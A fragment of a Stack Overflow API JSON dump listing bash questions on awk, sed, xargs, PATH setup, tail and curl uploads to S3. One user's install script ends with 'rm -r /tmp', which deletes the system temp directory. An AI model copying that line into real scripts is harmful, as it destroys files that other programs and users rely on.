<strong>ABC.mat</strong></p>\n"},{"tags":["bash","awk","grep"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":154,"score":0,"question_id":12534402,"title":"grep / awk - discard lines based on multiple columns","body":"<p>I would like to discard lines based upon matches in multiple columns.  For all matching occurrences in column 1, check the corresponding column 2.  Only if all column 2 entries are identical, discard all lines.  If even one entry in column 2 is different, then keep all lines.</p>\n\n<p>Example:</p>\n\n<p>Discard the first 3 lines because every column 2 entry is identical for Bob. However, keep the remaining 4 lines because at least one entry in column 2 differs for Jan: </p>\n\n<pre><code>Bob Blue\nBob Blue\nBob Blue\nJan Red\nJan Red\nJan Green\nJan Red\n</code></pre>\n"},{"tags":["apache","bash","awk","centos"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12535897,"title":"How do I print a range of data in awk?","body":"<p>I am reviewing my access_logs with a statment like:</p>\n\n<pre><code>cat access_log | grep 16/Sep/2012:17 | awk '{print $12 $13 $14 $15 $16}' | sort | uniq -c | sort -n | tail -40\n</code></pre>\n\n<p>The purpose is to see the user agent of the anyone that has been hitting my server for the last hour sorted by number of hits. My server has unusual activity to I want stop any unwanted spiders/etc.</p>\n\n<p>But the part: <code>awk '{print $12 $13 $14 $15 $16}'</code> would be much preferred as something like: <code>awk '{print $12-through-end-of-line}'</code> so that I could see the whole user agent which is a different length for each one.</p>\n\n<p>Is there a way to do this with awk?</p>\n"},{"tags":["linux","bash","shell"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12561654,"title":"BASH: difference between \"export k=1\" vs. \"k=1\"","body":"<p>I am going to write an script and It looks there is no difference between:</p>\n\n<pre><code>export k=1\n</code></pre>\n\n<p>and</p>\n\n<pre><code>k=1\n</code></pre>\n\n<p>Am I right?</p>\n"},{"tags":["bash","macports"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12557114,"title":"MacPorts and the bash PATH","body":"<p>I am using 10.8.1 (Mountain Lion).</p>\n\n<p>After upgrading to Mountain Lion, some of my MacPorts stopped working. For an easier life, I simply cleared out <code>/opt/local/</code> and reinstalled the latest version of MacPorts, followed by the ports themselves.</p>\n\n<p>This has had the side-effect that many of the ports I was using have gone back to their bundled OS X defaults. I opened up <code>.profile</code> to make sure that <code>/opt/local/bin</code> came first in the PATH, but that hasn't solved the problem.</p>\n\n<p>I suspect the output of <code>port select</code> is a symptom:</p>\n\n<pre><code>$ port select python\nAvailable versions for python:\n    none (active)  # shouldn't the bundled version be here?\n    python27\n    python32\n\n$ which python\n/usr/bin/python\n</code></pre>\n\n<p>Changing the active port (<code>sudo port select --set python python27</code>) solves the problem, but not all ports work with <code>port select</code>. Does anyone know what's going on here?</p>\n\n<p><strong>Edit</strong>: I should clarify that I don't consider this a complete fix - you're supposed to be able to change back to the Apple version with a command like <code>sudo port select --set python python25-apple</code>, which I suspect I'll only get back by solving the underlying problem.</p>\n\n<p>For the record, the contents of <code>~/.profile</code>:</p>\n\n<pre><code>export PATH=/opt/local/bin:/opt/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/bin:/usr/texbin\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":12556900,"title":"BASH - using a column of awk inside system","body":"<p>In Bash I'm trying to get the process with most %CPU. Once i get it, i'm using awk to evaluate if the process must be killed or just change it's nice. Once i get the process, here's what i'm trying to do :</p>\n\n<pre><code>awk -v awkmax=\"$CPU_MAX\" '\n{ \n  if( $3 &gt; awkmax &amp;&amp; $4 &lt; 15 ) { \n    system(\"renice \"$4\"+5 -p \"$1\"\")\n  } \n  else if ( $3 &gt; awkmax &amp;&amp; $4 == 15 ) { \n    system(\"kill -9 \"$1\"\")\n    print \"The process $1 has been killed.\\n\" \n  } \n}'\n</code></pre>\n\n<p>where <code>$3</code> is pcpu, <code>$4</code> is the nice value and <code>$1</code> is the pid.</p>\n\n<p>My problem is here:</p>\n\n<pre><code>system(\"renice \"$4\"+5 -p \"$1\"\")\n</code></pre>\n\n<p>it doesn't work because of the <code>\"$4\"+5</code>, which is the actual nice of the process plus 5.</p>\n\n<p>How can i pass that value to renice?</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12559648,"title":"use for loop to add 3 asterix before and after each word","body":"<p>I have an issue where I cannot complete this script. Here is part of the script that works. This is a linux bash script as well.</p>\n\n<pre><code>echo -n \"Please enter file \"\nread file\nif [ -f $file ]\nthen\n        echo \"$file found.\"\nelse\n        echo \"$file not found.\"\nfi\n</code></pre>\n\n<p>Write a script using the “for” loop that prints every word of a file with 3 asterix (*) before and after each word. The script should prompt the user to enter a file name and there must be validation of the existence of the file and whether the file is a regular text file.<br>\n<strong>Hint:</strong> use the cat, read, and file commands as well as an if statement in conjunction with your <code>for</code> loop.</p>\n"},{"tags":["bash","shell","terminal","environment-variables"],"answer_count":5,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":3594,"score":6,"question_id":1780483,"title":"LINES and COLUMNS environmental variables lost in a script","body":"<p>Consider the following:</p>\n\n<pre><code>me@mine:~$ cat a.sh \n#!/bin/bash\necho \"Lines: \" $LINES\necho \"Columns: \" $COLUMNS\nme@mine:~$ ./a.sh \nLines: \nColumns: \nme@mine:~$ echo \"Lines: \" $LINES\nLines:  52\nme@mine:~$ echo \"Columns: \" $COLUMNS\nColumns:  157\nme@mine:~$\n</code></pre>\n\n<p>The variables <code>$LINES</code> and <code>$COLUMNS</code> are shell variables, <strong>not</strong> environmental variables, and thus are not exported to the child process (but they are automatically updated when I resize the xterm window, even when logged in via ssh from a remote location). Is there a way in which I can let my script know the current terminal size?</p>\n\n<p>EDIT: \nI need this as a workaround do <a href=\"http://stackoverflow.com/questions/630519/can-you-make-vi-advance-the-screen-when-opened\">this problem</a>: vi (as well as vim, less, and similar commands) messes up the screen every time I use it. Changing the terminal is not an option, and thus I'm looking for workarounds (scrolling down <code>$LINES</code> lines surely is not the perfect solution, but at least is better than losing the previous screen)</p>\n"},{"tags":["linux","bash","command-line"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1302,"score":3,"question_id":3769206,"title":"How to compare the size of two directories?","body":"<p>I want to compare the total size of two directories <code>dir1</code> and <code>dir2</code> on different file-systems so that if <code>diff -r dir1 dir2</code> returns <code>0</code> then the total sizes will be equal. The <code>du</code> command returns the disk usage, and its option <code>--apparent-size</code> doesn't solve the problem. I now use something like </p>\n\n<pre><code>find dir1 ! -type d |xargs wc -c |tail -1\n</code></pre>\n\n<p>to know an approximation of dir1's size. Is there a better solution?</p>\n\n<p>edit:\nfor example, I have (<code>diff -r dir1 dir2</code> returns 0: they are equal):</p>\n\n<pre><code>du -s dir1 --&gt; 540\ndu -s dir2 --&gt; 166\n\ndu -sb dir1 --&gt; 250815 (the -b option is equivalent to --apparent-size -B1)\ndu -sb dir2 --&gt; 71495\n\nfind dir1 ! -type d |xargs wc -c --&gt; 62399\nfind dir2 ! -type d |xargs wc -c --&gt; 62399 \n</code></pre>\n"},{"tags":["python","django","osx","bash","nose"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12559947,"title":"xargs: passing 'find' tests.py to manage.py test","body":"<p>I try to execute following bash command in django project directory. I'm using <code>django-nose</code> as a TestRunner.</p>\n\n<pre><code>find . -name \\tests.py -print0 | xargs -0 -Ixxx ./manage.py test xxx --settings=project_name.conf.test.settings\n</code></pre>\n\n<p>but I get following errors (depending on number of tests.py files):</p>\n\n<pre><code>OSError: No such file /Users/user/Projects/project_name/{}\n</code></pre>\n\n<p>The same whithout <code>-print0</code> stops on first <code>tests.py</code></p>\n\n<p>Full traceback (command whithout <code>-print0</code>:</p>\n\n<pre><code>nosetests --verbosity 1 ./project_name/backend/tests.py\n./project_name/contrib/auth/tests.py\n./project_name/frontend/tests.py\n --failed --stop --nocapture --debug=DEBUG --nologcapture\nTo reuse old database \"test_db\" for speed, set env var REUSE_DB=1.\nTo reuse old database \"test_db1\" for speed, set env var REUSE_DB=1.\nCreating test database for alias 'default'...\nCreating schema msg\nCreating schema dict\nCreating test database for alias 'db2'...\nCreating schema msg\nCreating schema dict\nE\n======================================================================\nERROR: Failure: OSError (No such file /Users/user/Projects/project_name/{})\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/Users/user/.virtualenvs/project_name/lib/python2.7/site-packages/nose/failure.py\", line 39, in runTest\n    raise self.exc_class(self.exc_val)\nOSError: No such file /Users/user/Projects/project_name/{}\n\n----------------------------------------------------------------------\nRan 1 test in 0.001s\n\nFAILED (errors=1)\nDestroying test database for alias 'default'...\nDestroying test database for alias 'db2'...\n</code></pre>\n\n<p>What is the proper way to use <code>xargs</code> in such case?</p>\n"},{"tags":["linux","osx","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12558838,"title":"Kill a bash process when a specific string is read from stdout","body":"<p>I am using tail to read a logfile as it is updated and wish to exit the loop if grep returns a specific string.  I'm not sure how to exit or kill the process 'programmatically' </p>\n\n<p>Anyone have any great ideas?\nHere's some sample script: </p>\n\n<pre><code>tail -f /var/log/{system.log,kernel.log} | grep -i \"vendor: 0x22b8\"\n</code></pre>\n\n<p>Thanks :)</p>\n"},{"tags":["linux","bash","shell","tail"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":12558100,"title":"Linux shell scripting - assigning tail value to a variable?","body":"<p>I'm setting up a shell script that reads the last line of a log file using:</p>\n\n<pre><code>tail -1 \"/path/to/gdscript.log\"\n</code></pre>\n\n<p>.. which is echo'ing the last line of the script just fine. The last line of the log dictates whether the process succeeded or failed, so I'm trying to run a quick echo as follows (this is the bit I'm failing at):</p>\n\n<pre><code>if [ (tail -1 \"/path/to/gdscript.log\")  == \"Process Complete\" ]; then\necho \"Data Transfer OK\"\nelse\necho \"Data Transfer Failed\"\nexit 1\nfi\n</code></pre>\n\n<p>.. but using the script above I'm getting:</p>\n\n<pre><code>./gdscript.sh: line 14: syntax error near unexpected token `tail'\n</code></pre>\n\n<p>Can someone in the know show me how to format the IF gate above so that I can work off the last line of the log file? I'm new to shell scripting and would really appreciate the help.</p>\n\n<p>Thanks,\nPaul G</p>\n"},{"tags":["perl","apache","bash","alias"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12557908,"title":"Difficulty running a Perl script as a Bash alias","body":"<p>To format my apache error_log so that it is more pleasurable to look at I have written a quick and dirty perl script. </p>\n\n<pre><code>tail -f /var/log/apache2/error_log | perl -ne \n  '($timeStamp, $error, $hostName, $message) = \n      /^\\[([^\\]]+)\\] \\[([^\\]]+)\\] (?:\\[client ([^\\]]+)\\])?\\s*(.*)$/i; # Parse log\n   ($day, $month, $date, $time, $year) = \n      $timeStamp =~ m/(\\S*) (\\S*) (\\S*) (\\S*) (\\S*)$/; # Extract the timestamp\n   $message =~ s/, referer: (.*)$/\\./;  # Strip the referer references\n   $message =~ s/\\\\n/\\n/g; # Replace literal new lines to expand object dumps\n   print $time . \" \" . $date . \" \" . $month . \" | \" . $message .\"\\n\";'\n</code></pre>\n\n<p>I want to add the script to a Bash alias so that I can call it easily from terminal.</p>\n\n<p>e.g.</p>\n\n<pre><code>alias te=tail -f /var/log/apache2/error_log | perl -ne '($timeStamp, $error, $hostName, $message) = /^\\[([^\\]]+)\\] \\[([^\\]]+)\\] (?:\\[client ([^\\]]+)\\])?\\s*(.*)$/i; ($day, $month, $date, $time, $year) = $timeStamp =~ m/(\\S*) (\\S*) (\\S*) (\\S*) (\\S*)$/; $message =~ s/, referer: (.*)$/\\./; $message =~ s/\\\\n/\\n/g; print $time . \" \" . $date . \" \" . $month . \" | \" . $message .\"\\n\";'\n</code></pre>\n\n<p>Obviously escaping quotes starts to get messy. I've also tried putting the perl script in its own file and running that as an alias but I want to avoid having to run a script outside of the .bash_profile file for portability.</p>\n\n<p>How can I use the perl script as a bash alias/function? Or am I coming at this from totally the wrong direction? </p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":12557131,"title":"Complicated bash variable syntax","body":"<p>In one bash script i found the next construction:</p>\n\n<pre><code>if [[ \"${xvar[id]:0:${#cnt}}\" != \"$cnt\" ]]; then\n</code></pre>\n\n<p>Can someone explain what the above condition does?</p>\n"},{"tags":["bash","vim","sed","vi","search-and-replace"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12532707,"title":"Search and delete a block using sed command in ubuntu","body":"<p>The thing I would like to perform is to 1- Find and 2- delete the whole definition block of (__c64):</p>\n\n<pre><code>unsigned long long __c64(unsigned int llvm_cbe_hi, unsigned int llvm_cbe_lo) {\nunsigned long long llvm_cbe_retval;    /* Address-exposed local */\nunsigned long long llvm_cbe_retval1;\n\n\n\n  *(&amp;llvm_cbe_retval) = (((((unsigned long long )(unsigned int )llvm_cbe_hi)) &lt;&lt; 32ul) |  (((unsigned          long long )(unsigned int )llvm_cbe_lo)));\n  llvm_cbe_retval1 = *(&amp;llvm_cbe_retval);\n  return llvm_cbe_retval1;\n}\n</code></pre>\n\n<p>in all but one .c files in a project.  Since in the compilation phase of .o to the executable,  I got the error \"Multiple definition of __c64\", I was thinking to delete all of those but one in order to solve the problem.</p>\n\n<p>Any ideas?</p>\n\n<p>Regards,</p>\n\n<p>Amir</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":41,"score":5,"question_id":12555849,"title":"Generating variations with bash","body":"<p>Looking for en nicer solution for the next code:</p>\n\n<pre><code>for i in a b c\ndo\n  for j in A B C\n  do\n    for k in 1 2 3\n    do\n      echo \"$i$j$k\"\n    done\n  done\ndone\n</code></pre>\n\n<p>Sure is here some simpler solution.</p>\n"},{"tags":["bash","cat"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":64,"score":4,"question_id":12554698,"title":"display content of all files with their filenames with cat","body":"<p>I cannot find a way to print each filename before its content with <code>cat</code>. Here's what I'm trying to do:</p>\n\n<pre><code>raja@badfox:~/Perl/t$ ls\n1.txt  2.txt  3.txt\nraja@badfox:~/Perl/t$ echo \" I am \" &gt;&gt; 1.txt \nraja@badfox:~/Perl/t$ echo \" trying \" &gt;&gt; 2.txt \nraja@badfox:~/Perl/t$ echo \" to do this \" &gt;&gt; 3.txt \nraja@badfox:~/Perl/t$ cat *.*\n I am \n trying \n to do this \nraja@badfox:~/Perl/t$ \n</code></pre>\n\n<p>In the last command I got only the text from those files but I actually want the text along with the file names. I mean like this  </p>\n\n<pre><code>Filename:1.txt \n&lt;Data in the file&gt;\n\nFilename:2.txt \n&lt;Data in that file&gt;\n\nFilename:3.txt\n&lt;Data in that file &gt;\n</code></pre>\n"}]}
{"total":16352,"page":18,"pagesize":100,"questions":[{"tags":["bash","script"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":70,"score":3,"question_id":11723907,"title":"Downloading and automatically installing a tgz file","body":"<pre><code>#!/bin/bash\n\nmkdir /tmp\ncurl -O http://www.mucommander.com/download/nightly/mucommander-current.app.tar.gz /tmp/mucommander.tgz\ntar -xvzf /tmp/mucommander.tgz */mucommander.app/*\ncp -r /tmp/mucommander.app /Applications\nrm -r /tmp\n</code></pre>\n\n<p>I'm trying to create a shell script to download and extract muCommander to my applications directory on a Mac.</p>\n\n<p>I tried cd into the tmp dir, but then the script stops when I do that.\nI can extract all using the  -C argument, but  the current tgz path is muCommander-0_9_0/mucommander.app, which could change on later builds, so I'm trying to keep it generic.</p>\n\n<p>Can anyone give me pointers where I'm going wrong?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["bash","printf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12551509,"title":"confused by printf in linux bash","body":"<p>I'm confused by <code>printf</code>, here is what I did,</p>\n\n<pre><code>printf \"%x\" 1024  # output 400\nprintf \\\\x400  # output @0\nprintf \\\\x400 | od -An -tu4  # output 12352, why 12352 not 1024?\n</code></pre>\n"},{"tags":["c++","linux","bash","shell","terminal"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":118,"score":0,"question_id":12552997,"title":"Emulating a linux/bash shell in C++?","body":"<p>So I am basically looking for the easiest approach here, what I want as a result is an in-game-linux-shell (will be rendered using opengl and sfml), that will emulate/simulate a linux box.\nIt doesn't need to be all that fancy, what I prioritize is the basics (ls, grep, cat, echo..), some kind of editor (vim/nano-like), and that the game logic can interact with /dev, /etc etc.</p>\n\n<p>I've thought about chrooting an environment, but I see more issues than solutions doing so. Also thought about if there is some kind of popular linux emulator written in C++ which can be  tightly integrated with the hostcode, this is a longshot and I haven't found anything yet.</p>\n\n<p>Any help in getting me on the right path is hugely appreciated!</p>\n\n<p>PS. The end-product will be cross-plattform (at least for win / linux)</p>\n"},{"tags":["linux","bash","unix","script"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":84,"score":2,"question_id":12548645,"title":"Apply two greps and awk to same input","body":"<p>I'm using two short UNIX commands in my python script to get some data about nearby wireless access points.</p>\n\n<ul>\n<li>n°1, gets the ESSID of the access point : </li>\n</ul>\n\n<p><code>\"iwlist NIC scan | grep ESSID | awk '{print $1}'\"</code></p>\n\n<ul>\n<li>n°2, gets the signal strength of the access point :</li>\n</ul>\n\n<p><code>\"iwlist NIC scan | grep level | awk '{print $3}'\"</code></p>\n\n<p>My problem is that I use these two commands one after the other which means that it doesn't generate \"symmetric\" data. You might get 6 ESSIDs and 4 Signal strength data.</p>\n\n<p>Because the first time, the script found 6 APs (A, B, C, D, E and F) and the next time only 4 APs (A, C, E and F).</p>\n\n<p>Some my question is the following :</p>\n\n<ul>\n<li>Is there a way to \"split\" the result of the first <code>iwlist NIC scan</code> and then apply two different <code>grep</code> and <code>awk</code> sequences to the same input ?</li>\n</ul>\n\n<p>Just so that you at least get a symmetric list of results.</p>\n\n<p>Thank you in advance !</p>\n"},{"tags":["bash","sed","character","swap"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12551917,"title":"sed swap characters in specific positions in strings of varying lengths","body":"<p>I've been trying to learn sed and the examples I've found here are for swapping dates from 05082012 to 20120805 and I'm having trouble adapting them to my current need.</p>\n\n<p>I need to convert an IP address 10.4.13.22 to a reverse lookup of 22.13.4.10 for a nsupdate script. My biggest problem is the fact that sometimes each octet can change lengths e.g. 10.4.13.2 and 10.19.8.126</p>\n\n<p>Thanks for any help!</p>\n\n<pre><code>echo 10.0.2.99 | sed 's/\\(....\\)\\(....\\)/\\2\\1/'\n</code></pre>\n\n<p>this is currently what I've tried, just based off another question here, but since the examples don't provide much explanation as to what .... means, Im having trouble understanding what it does.</p>\n\n<p>This is the output of that command .2.910.09 and I am expecting 99.2.0.10</p>\n\n<p>Directly, I want to rearrange each \"section\" that is separated by a \".\"</p>\n"},{"tags":["bash","wildcard","ls"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":956,"score":3,"question_id":8525437,"title":"List files not matching a pattern?","body":"<p>Here's how one might list all files matching a pattern in bash:</p>\n\n<pre><code>ls *.jar\n</code></pre>\n\n<p>How to list the complement of a pattern? i.e. all files not matching *.jar?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":78,"score":-1,"question_id":12550702,"title":"generate a binary file from a text file in linux shell","body":"<p>I have a text file a.txt, inside which each line consists of 2 numbers, looks like this:</p>\n\n<pre><code>1234 5678\n</code></pre>\n\n<p>Now I want to convert a.txt's content from text into binary, which means the numbers won't be text anymore, but binary representation, which can be viewed by <code>od -tu4</code>.</p>\n\n<p>How can I do that via <code>bash</code>?</p>\n"},{"tags":["bash","shell","awk","echo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12550659,"title":"Make awk interpret one line at a time from variable","body":"<p>I'm a completely new to shell scripting and bash. My question is how do I get awk to interpret a variable which contains linebreaks the same way as awk interpret the data from stdin?</p>\n\n<p>Example:</p>\n\n<pre><code>fileData=`cat /path/to/file`\necho $fileData | awk '{print $1}'\n</code></pre>\n\n<p>The code above results in the following error message: <code>awk: program limit exceeded: maximum number of fields size=32767</code> which obviously means that awk interprets all the lines in <code>$fileData</code> at the same time and not one line at a time.</p>\n\n<p>How to make awk interpret one line at a time from a variable?</p>\n"},{"tags":["bash","random","numbers"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12550372,"title":"generate non-repeating random number sequences in bash","body":"<p>I have been futzing about learning bash tonight and I have been trying to create a random number sequence that uses all the numbers of a range and uses each digit just once. So something like inputting the range of 1-5 will output something like 4-3-5-2-1 or 2-5-1-3-4 and so on. I am as stuck as can be on this one.</p>\n\n<p>Thanks!</p>\n"},{"tags":["arrays","bash","list"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":4734,"score":4,"question_id":3014908,"title":"How to output an array's content in columns in BASH","body":"<p>I wanted to display a long list of strings from an array.</p>\n\n<p>Right now, my script run through a for loop echoing each value to the standard output:</p>\n\n<pre><code>for value in ${values[@]}\ndo\n  echo $value\ndone\n</code></pre>\n\n<p>Yeah, that's pretty ugly! And the one column listing is pretty long too...</p>\n\n<p>I was wondering if i can find a command or builtin helping me to display all those values in columns, like the <code>ls</code> command does by default when listing a directory (<code>ls -C</code>).</p>\n\n<p><strong>[Update]</strong></p>\n\n<p>Losing my brain with <code>column</code> not displaying properly formatted columns, here's more info:</p>\n\n<p>The values: <code>$ values=( 01----7 02----7 03-----8 04----7 05-----8 06-----8 07-----8 08-----8 09---6 10----7 11----7 12----7 13----7 14-----8 15-----8 16----7 17----7 18---6 19-----8 20-----8 21-----8)</code> <em>(Notice the first two digits as an index and the last one indicating the string length for readability)</em></p>\n\n<p>The command: <code>echo \" ${values[@]/%/$'\\n'}\" | column</code></p>\n\n<p>The result: <img src=\"http://tychostudios.ch/multipurpose/bad_columns.png\" alt=\"bad columns\"></p>\n\n<p>Something is going wrong...</p>\n"},{"tags":["bash","tomcat","terminal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":11026376,"title":"bash error : Cannot find /Library/...../setclasspath.sh, but it's there","body":"<p>i am very new to bash (or using the terminal in general) and i'm trying to set up tomcat server and I am using the instructions from a website that has instructed me to</p>\n\n<pre><code>      # Execute the Tomcat startup script\n      ./startup.sh \n</code></pre>\n\n<p>but when i enter the ./startup.sh command i get an error</p>\n\n<pre><code>      Cannot find /Library/Tomcat/Home/bin/setclasspath.sh\n</code></pre>\n\n<p>but the setclasspath.sh is there (see screenshot below):</p>\n\n<p><img src=\"http://i.stack.imgur.com/PaY28.png\" alt=\"enter image description here\"></p>\n\n<p>What am i doing wrong????</p>\n\n<hr>\n\n<p>now i cannot cd to Home  (see screenshot below):</p>\n\n<p><img src=\"http://i.stack.imgur.com/xlbvh.png\" alt=\"enter image description here\"></p>\n\n<p>here is the path info:\n<img src=\"http://i.stack.imgur.com/qHNPs.png\" alt=\"enter image description here\"></p>\n"},{"tags":["bash","newline","line-breaks","wc"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12524308,"title":"Bash: Remove linebreak after result","body":"<p>When I execute commands in bash, specifically <code>wc -l &lt; log.txt</code>, the result is returned with a linebreak after it. How do I get rid of it?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":275,"score":3,"question_id":7835407,"title":"how to generate random number with find and sed?","body":"<p>how to generate random number in this code?\nI try use $RANDOM, but the number is still the same. How to improve it?</p>\n\n<pre><code>find . -type f  -exec sed -i 's/&lt;field name=\\\"test/&lt;field name=\\\"test$RANDOM/g' {} \\;\n</code></pre>\n"},{"tags":["osx","bash","sublimetext"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":600,"score":3,"question_id":10767738,"title":"Adding /bin to OS X path","body":"<p>I've been having trouble modifying my path to add Sublime Text 2. I've added a /bin directory and <a href=\"http://www.sublimetext.com/docs/2/osx_command_line.html\" rel=\"nofollow\">run this command</a>:</p>\n\n<pre><code>ln -s \"/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl\" ~/bin/subl\n</code></pre>\n\n<p>The subl link appears in /bin. But I need to add the /bin directory to my path. I'm fairly new at this, and I don't know where my path is. I've looked around, and found that the likely files are either .profile, .bash_profile or .bashrc </p>\n\n<p>I don't have a .bash_profile. To .profile and .bashrc I added </p>\n\n<pre><code>PATH=$PATH:~/bin/subl\nexport PATH\n</code></pre>\n\n<p>Is that the right thing to add? And if so, where should I add it? </p>\n\n<p>When I 'echo $PATH', I get:</p>\n\n<blockquote>\n  <p>/Users//.rvm/gems/ruby-1.9.3-p194@rails3tutorial2ndEd/bin:/Users//.rvm/gems/ruby-1.9.3-p194@global/bin:/Users//.rvm/rubies/ruby-1.9.3-p194/bin:/Users//.rvm/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/bin</p>\n</blockquote>\n\n<p>When I type 'subl', I get: </p>\n\n<blockquote>\n  <p>-bash: subl: command not found</p>\n</blockquote>\n\n<p>Thanks!</p>\n\n<p>p.s. I had previously installed Macports, which modified my .profile file. Not sure if this has anything to do with it - I now don't know what the default .profile looks like.</p>\n"},{"tags":["linux","bash","xorg","tty","raspberry-pi"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12547971,"title":"Run a script after killing lxsession (xorg)","body":"<p>I am trying to run a program automatically within a bash script after killing the LXDE session. My script consists of:</p>\n\n<pre><code>#!/bin/sh\npkill lxsession;\nsh /home/pi/RetroPie/EmulationStation/emulationstation\n</code></pre>\n\n<p>I tried this as well:</p>\n\n<pre><code>#!/bin/sh\nnohup &amp; pkill lxsession &amp; \nwritevt /dev/tty1 'emulationstation'\n</code></pre>\n\n<p>My aim is to log out of the LXDE session and run EmulationStation on my Raspberry Pi with a bash script. I'm using <code>pkill lxsession;</code> to bypass lxsession's logout confirmation dialog.</p>\n\n<p>As it stands, this script just gets me to the command line from a working LXDE desktop. Thanks for reading.</p>\n"},{"tags":["linux","bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12547845,"title":"Linux - Location of code","body":"<p>I have a bash script which sets up my server and part of the script pulls in the code for the website.</p>\n\n<p>What is a sensible location for this code?</p>\n\n<p>For example, my software goes in /opt/</p>\n\n<p>My best guess is that my code should go in /home?</p>\n"},{"tags":["java","bash","curl","amazon-s3"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":991,"score":4,"question_id":9067993,"title":"Upload to s3 with curl using pre-signed URL (getting 403)","body":"<p>I'm using curl to call into a Java ReST API to retrieve a URL. Java then generates a pre-signed URL for S3 upload using my S3 credentials, and returns that in the ReST reply. Curl takes the URL and uses that for upload to S3, but S3 returns 403 \"The request signature we calculated does not match the signature you provided. Check your key and signing method.\"</p>\n\n<p>Here is the code I'm using to generate the pre-signed URL:</p>\n\n<pre><code>public class S3Util {\n    static final AmazonS3 s3 = new AmazonS3Client( new AWSCredentials() {\n        @Override\n        public String getAWSAccessKeyId() {\n            return \"XXXXXXX\";\n        }\n        @Override\n        public String getAWSSecretKey() {\n            return \"XXXXXXXXXXXXXX\";\n        }\n    });\n    static final String BUCKET = \"XXXXXXXXXXXXXXXXXXXXXXXXXXX\";\n\n    static public URL getMediaChunkURL( MediaChunk mc, HttpMethod method ) {\n        String key = ...\n        //way in the future (for testing)...\n        Date expiration = new Date( System.currentTimeMillis() + CalendarUtil.ONE_MINUTE_IN_MILLISECONDS*60*1000 );\n\n        GeneratePresignedUrlRequest req = new GeneratePresignedUrlRequest(BUCKET, key, method);\n        req.setExpiration(expiration);\n        req.addRequestParameter(\"Content-Type\", \"application/octet-stream\");\n\n        //this gets passed to the end user:\n        return s3.generatePresignedUrl(req);\n    }\n}\n</code></pre>\n\n<p>and in curl, run from bash, I execute this:</p>\n\n<pre><code>echo Will try to upload chunk to ${location}\ncurl -i -X POST \\\n        -F 'Content-Type=application/octet-stream' \\\n        -F \"file=@${fileName}\" \\\n        ${location} || (echo upload chunk failed. ; exit 1 )\n</code></pre>\n\n<p>Among other things, I have tried PUT, and I have tried \"Content-type\" (lowercase T). I realize I'm missing something (or somethings) obvious, but after reading the appropriate docs, googling and looking at lots of similar questions I'm not sure what that is. I see lots of hints about required headers, but I thought the resigned URL was supposed to eliminate those needs. Maybe not?</p>\n\n<p>TIA!</p>\n\n<p><strong>Update:</strong></p>\n\n<p>Just to be clear, I have tested downloads, and that works fine.</p>\n\n<p>Java looks like:</p>\n\n<pre><code>GeneratePresignedUrlRequest req = new GeneratePresignedUrlRequest(BUCKET, key, HttpMethod.GET);\nreq.setExpiration(expiration);\n</code></pre>\n\n<p>and curl is simply:</p>\n\n<pre><code>curl -i 